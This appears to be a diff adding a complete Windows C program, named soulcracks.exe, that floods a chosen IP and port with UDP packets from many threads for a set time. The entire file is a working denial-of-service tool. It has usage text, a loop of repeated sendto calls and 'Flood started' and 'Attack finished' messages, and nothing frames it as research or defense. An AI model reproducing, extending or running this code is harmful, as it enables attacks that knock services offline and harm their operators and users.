@@ -1,0 +1,109 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <time.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+void usage() {
+    printf("Usage: soulcracks.exe ip port time threads\n");
+    exit(1);
+}
+
+struct thread_data {
+    char *ip;
+    int port;
+    int time;
+};
+
+DWORD WINAPI attack(LPVOID arg) {
+    struct thread_data *data = (struct thread_data *)arg;
+    SOCKET sock;
+    struct sockaddr_in server_addr;
+    time_t endtime;
+
+    char *payloads[] = {
+        "\xd9\x00",
+    };
+
+    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) {
+        printf("Socket creation failed. Error: %d\n", WSAGetLastError());
+        return 1;
+    }
+
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(data->port);
+    server_addr.sin_addr.s_addr = inet_addr(data->ip);
+
+    endtime = time(NULL) + data->time;
+
+    while (time(NULL) <= endtime) {
+        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
+            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
+                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+                printf("Send failed. Error: %d\n", WSAGetLastError());
+                closesocket(sock);
+                return 1;
+            }
+        }
+    }
+
+    closesocket(sock);
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 5) {
+        usage();
+    }
+
+    char *ip = argv[1];
+    int port = atoi(argv[2]);
+    int time = atoi(argv[3]);
+    int threads = atoi(argv[4]);
+
+    HANDLE *thread_handles = malloc(threads * sizeof(HANDLE));
+    struct thread_data **thread_data_array = malloc(threads * sizeof(struct thread_data *));
+
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        printf("WSAStartup failed. Error: %d\n", WSAGetLastError());
+        return 1;
+    }
+
+    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);
+
+    for (int i = 0; i < threads; i++) {
+        struct thread_data *data = malloc(sizeof(struct thread_data));
+        data->ip = ip;
+        data->port = port;
+        data->time = time;
+        thread_data_array[i] = data;
+
+        thread_handles[i] = CreateThread(NULL, 0, attack, (void *)data, 0, NULL);
+        if (thread_handles[i] == NULL) {
+            printf("Thread creation failed. Error: %d\n", GetLastError());
+            free(data);
+            free(thread_handles);
+            WSACleanup();
+            return 1;
+        }
+    }
+
+    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);
+
+    for (int i = 0; i < threads; i++) {
+        CloseHandle(thread_handles[i]);
+        free(thread_data_array[i]);
+    }
+
+    free(thread_handles);
+    free(thread_data_array);
+
+    WSACleanup();
+    printf("Attack finished\n");
+    return 0;
+}
